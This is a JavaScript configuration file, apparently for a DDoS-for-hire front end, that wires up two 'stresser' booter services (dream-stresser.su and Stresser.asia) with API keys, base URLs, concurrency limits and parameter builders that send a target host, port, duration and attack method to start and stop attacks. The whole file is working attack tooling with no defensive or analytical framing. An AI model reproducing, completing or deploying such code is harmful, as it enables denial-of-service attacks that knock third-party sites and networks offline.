// apiConfig.js
module.exports = {
    dreamStresser: {
        name: 'dreamStresser',
        api_key: '',
        maxConcurrents: 20,
        baseUrl: 'https://api.dream-stresser.su',
        startPath: '/',
        stopPath: '/',
        method: 'get',
        params: {
            start: (params) => ({
                key: params.api_key,
                host: params.address,
                port: params.port,
                time: params.time, 
                method: params.methodApiName,
                vip: 0
            }),
            stop: (params) => ({
                key: params.api_key,
                host: params.address, 
                port: params.port,
                time: params.time, 
                method: 'STOP',
                vip: 0
            })
        },
        stopBy: 'ip'
    },
    stresserAsia: {
        name: 'stresserAsia',
        api_key: '',
        maxConcurrents: 6,
        baseUrl: 'https://Stresser.asia/v2',
        startPath: '/start',
        stopPath: '/stop',
        method: 'get',
        params: {
            start: (params) => ({
                api_key: params.api_key,
                user: 384,
                target: params.address,
                time: params.time, // Use 'time' consistentemente
                port: params.port,
                method: params.methodApiName
            }),
            stop: (params) => ({
                api_key: params.api_key,
                user: 384,
                stopper: params.attackId
            })
        },
        stopBy: 'id'
    }
}